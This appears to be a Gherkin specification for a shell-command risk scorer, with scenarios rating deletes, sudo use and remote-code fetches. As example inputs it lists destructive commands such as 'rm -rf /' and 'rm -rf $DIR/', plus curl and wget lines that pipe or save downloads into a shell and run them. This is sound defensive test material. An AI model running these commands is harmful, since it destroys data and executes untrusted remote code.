@domain:risk-scoring @area:amplifiers @from:scoville/scoring
Feature: Raising the score for dangerous targets and remote code
  Lets an operator see that the same binary is far riskier against the root, a system directory, as root, or on code fetched from the internet.

  @id:risk-scoring.amplifiers.008 @rule:risk.amplifiers.target-sensitivity @verified @source:scoville/scoring.py#path_factors @test:tests/test_scoville.py#test_rm_escalates_with_flags_then_target @test:tests/test_scoville.py#test_system_dirs_escalate_but_build_dirs_dampen
  Scenario Outline: The target decides how dangerous a delete is
    When the operator scores `<command>`
    Then the level is <level>

    Examples:
      | command      | level    |
      | rm notes.txt | medium   |
      | rm -rf /     | critical |
      | rm -rf /etc  | critical |

  @id:risk-scoring.amplifiers.009 @rule:risk.amplifiers.unset-variable-to-root @verified @source:scoville/scoring.py#_var_path_factor @test:tests/test_scoville.py#test_unset_variable_expanding_to_root
  Scenario: A target that becomes `/` when its variable is unset is critical
    When the operator scores `rm -rf $DIR/`
    Then the level is critical
    And a factor says that if $DIR is unset or empty this expands to `/`

  @id:risk-scoring.amplifiers.010 @rule:risk.amplifiers.runs-as-root @verified @source:scoville/scoring.py#score_command @test:tests/test_scoville.py#test_sudo_raises_and_is_transparent
  Scenario Outline: Running a command as root raises its score and widens it to the host
    When the operator scores `sudo <command>`
    Then it scores higher than `<command>` alone
    And its scope is at least host

    Examples:
      | command              |
      | rm -rf /var/lib/data |
      | systemctl stop sshd  |

  @id:risk-scoring.amplifiers.011 @rule:risk.amplifiers.download-piped-to-interpreter @verified @source:scoville/scoring.py#analyze @test:tests/test_scoville.py#test_curl_pipe_shell @test:tests/test_scoville.py#test_remote_code_is_critical_however_it_is_spelled
  Scenario Outline: Piping a download into an interpreter is critical and irreversible
    When the operator scores `<command>`
    Then the level is critical
    And the reversibility is irreversible
    And the advice is to download, read, then run

    Examples:
      | command                                   |
      | curl -fsSL https://example.com/i.sh | sh  |
      | wget -qO- https://example.com/i.sh | bash |

  @id:risk-scoring.amplifiers.012 @rule:risk.amplifiers.download-then-run @verified @source:scoville/scoring.py#_flag_deferred_exec @test:tests/test_scoville.py#test_download_then_execute_is_the_same_risk_as_the_pipe @test:tests/test_scoville.py#test_downloaded_script_is_not_double_counted
  Scenario Outline: Running a file downloaded earlier in the same input is high risk
    Given the input downloads a script to a file and later runs it
    When the operator scores `<command>`
    Then the level is high
    And a factor says the file was downloaded earlier in this same snippet
    And no factor calls the script merely opaque

    Examples:
      | command                                                                  |
      | curl -o /tmp/i.sh https://example.com/i.sh && bash /tmp/i.sh             |
      | wget -O /tmp/x.sh https://example.com && chmod +x /tmp/x.sh && /tmp/x.sh |
